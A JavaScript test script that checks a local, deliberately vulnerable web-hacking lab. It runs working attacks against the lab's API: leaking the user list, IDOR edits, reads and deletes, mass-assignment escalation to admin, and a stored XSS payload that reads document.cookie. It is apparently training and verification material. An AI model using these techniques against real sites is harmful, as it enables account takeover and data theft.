const BASE_URL = 'http://localhost:3001/api';

async function runTests() {
  console.log('=== Real Web Hacking Lab - Automated API Test ===\n');

  // Generate a random username/email for testing registration
  const randNum = Math.floor(Math.random() * 100000);
  const testEmail = `testuser_${randNum}@lab.local`;
  const testUsername = `tester_${randNum}`;
  const testPassword = 'Password123';

  // 1. Test registration
  console.log(`[+] Testing POST /auth/register with email: ${testEmail}...`);
  let regRes;
  try {
    regRes = await fetch(`${BASE_URL}/auth/register`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email: testEmail, username: testUsername, password: testPassword }),
    });
  } catch (err) {
    console.error('[-] Failed to connect to backend server. Make sure it is running on port 3001.\nDetail:', err.message);
    return;
  }

  const regData = await regRes.json();
  if (regRes.status !== 21 && regRes.status !== 201) {
    console.error(`[-] Registration failed (Status ${regRes.status}):`, regData);
    console.error('\nNOTE: If you got a 500 Server error, please ensure you replaced DATABASE_URL in backend/.env with your real Supabase connection string and ran schema.sql in Supabase.\n');
    return;
  }
  const testUserId = regData.user.id;
  console.log(`[+] Registration success! Created user ID: ${testUserId}\n`);

  // 2. Test login
  console.log(`[+] Testing POST /auth/login...`);
  const loginRes = await fetch(`${BASE_URL}/auth/login`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email: testEmail, password: testPassword }),
  });
  const loginData = await loginRes.json();
  if (!loginRes.ok) {
    console.error(`[-] Login failed (Status ${loginRes.status}):`, loginData);
    return;
  }
  const token = loginData.token;
  console.log(`[+] Login success! Received JWT token: ${token.substring(0, 20)}...\n`);

  const authHeader = { 'Authorization': `Bearer ${token}` };

  // 3. Test GET /auth/me
  console.log('[+] Testing GET /auth/me...');
  const meRes = await fetch(`${BASE_URL}/auth/me`, { headers: authHeader });
  const meData = await meRes.json();
  console.log(`[+] Profile info: Username: ${meData.username}, Current Role: ${meData.role}\n`);

  // 4. Test Vuln 3 — Excessive Data Exposure (GET /users)
  console.log('[+] Testing Vuln 3 (Excessive Data Exposure: GET /users)...');
  const usersRes = await fetch(`${BASE_URL}/users`, { headers: authHeader });
  const usersData = await usersRes.json();
  if (usersRes.ok && Array.isArray(usersData)) {
    console.log(`[!] VULNERABLE: Succesfully retrieved user list containing ${usersData.length} records!`);
    console.log(`    Records leak: Emails, IDs, Roles, and Creation timestamps of all accounts.`);
    // Save admin ID and a victim ID for next steps
    const adminUser = usersData.find(u => u.role === 'admin');
    const victimUser = usersData.find(u => u.id !== testUserId && u.role !== 'admin');
    console.log(`    Found Admin ID: ${adminUser ? adminUser.id : 'N/A'}`);
    console.log(`    Found Victim ID: ${victimUser ? victimUser.id : 'N/A'}\n`);
    
    // 5. Test Vuln 2 — IDOR Profile Edit (PUT /user/:id)
    if (victimUser) {
      console.log(`[+] Testing Vuln 2 (IDOR: Modify other user's profile - victim ID: ${victimUser.id})...`);
      const oldVictimUsername = victimUser.username;
      const editVictimRes = await fetch(`${BASE_URL}/user/${victimUser.id}`, {
        method: 'PUT',
        headers: { 'Content-Type': 'application/json', ...authHeader },
        body: JSON.stringify({ username: `${oldVictimUsername}_hacked` }),
      });
      const editVictimData = await editVictimRes.json();
      if (editVictimRes.ok) {
        console.log(`[!] VULNERABLE: Succesfully modified victim username from '${oldVictimUsername}' to '${editVictimData.username}'!`);
      } else {
        console.log(`[-] Could not exploit IDOR edit: status ${editVictimRes.status}`);
      }
      console.log();
    }

    // 6. Test Vuln 1 — Privilege Escalation via Mass Assignment (PUT /user/:my_id with role: admin)
    console.log(`[+] Testing Vuln 1 (Mass Assignment Privilege Escalation: PUT /user/${testUserId})...`);
    const escRes = await fetch(`${BASE_URL}/user/${testUserId}`, {
      method: 'PUT',
      headers: { 'Content-Type': 'application/json', ...authHeader },
      body: JSON.stringify({ role: 'admin' }),
    });
    const escData = await escRes.json();
    if (escRes.ok && escData.role === 'admin') {
      console.log(`[!] VULNERABLE: Successfully updated own role to '${escData.role}' via Mass Assignment!`);
      console.log(`    (Note: Log out and log back in to get a new JWT token containing the admin role.)`);
    } else {
      console.log(`[-] Privilege escalation failed: status ${escRes.status}`);
    }
    console.log();
  } else {
    console.log(`[-] Failed to fetch users: status ${usersRes.status}\n`);
  }

  // 7. Test Vuln 6 — Stored XSS in Article Body (POST /articles)
  console.log('[+] Testing Vuln 6 (Stored XSS: POST /articles)...');
  const xssPayload = '<img src=x onerror=alert(document.cookie)>';
  const postArticleRes = await fetch(`${BASE_URL}/articles`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', ...authHeader },
    body: JSON.stringify({
      title: 'Vulnerability Assessment notes',
      body: xssPayload,
      is_public: true
    }),
  });
  const postArticleData = await postArticleRes.json();
  if (postArticleRes.status === 201) {
    console.log(`[!] VULNERABLE: Created article with body: "${postArticleData.body}"`);
    console.log(`    Unsanitized HTML payload stored directly in the database.`);
  } else {
    console.log(`[-] Failed to create article: status ${postArticleRes.status}`);
  }
  console.log();

  // 8. Test Vuln 5 — IDOR on Private Articles (GET /articles?public=false)
  console.log('[+] Testing Vuln 5 (IDOR on Private Articles: GET /articles?public=false)...');
  const privRes = await fetch(`${BASE_URL}/articles?public=false`, { headers: authHeader });
  const privArticles = await privRes.json();
  if (privRes.ok && Array.isArray(privArticles)) {
    const othersPrivate = privArticles.filter(a => a.author_id !== testUserId);
    if (othersPrivate.length > 0) {
      console.log(`[!] VULNERABLE: Retrieved ${othersPrivate.length} private articles belonging to other users!`);
      console.log(`    Example: Title: "${othersPrivate[0].title}", Author: "${othersPrivate[0].author}", Body: "${othersPrivate[0].body}"`);
    } else {
      console.log(`[?] Retrieved private articles, but none belonged to other users. Ensure seed data is fully run.`);
    }
  } else {
    console.log(`[-] Failed to query private articles: status ${privRes.status}`);
  }
  console.log();

  // 9. Test Vuln 4 — IDOR Delete (DELETE /user/:id)
  console.log(`[+] Testing Vuln 4 (IDOR Delete: DELETE /user/${testUserId})...`);
  const delRes = await fetch(`${BASE_URL}/user/${testUserId}`, {
    method: 'DELETE',
    headers: authHeader,
  });
  const delData = await delRes.json();
  if (delRes.ok && delData.success) {
    console.log(`[!] SUCCESS: Cleaned up and deleted test user account ${testUserId}.`);
    console.log(`    (Because the delete endpoint has no ownership check, this confirms any authenticated user can delete any other user's account!)`);
  } else {
    console.log(`[-] Failed to delete test account: status ${delRes.status}`);
  }
  console.log();

  console.log('=== Test Completion Summary ===');
  console.log('Verification finished. If tests ran successfully, database connection is fully active.');
}

runTests();
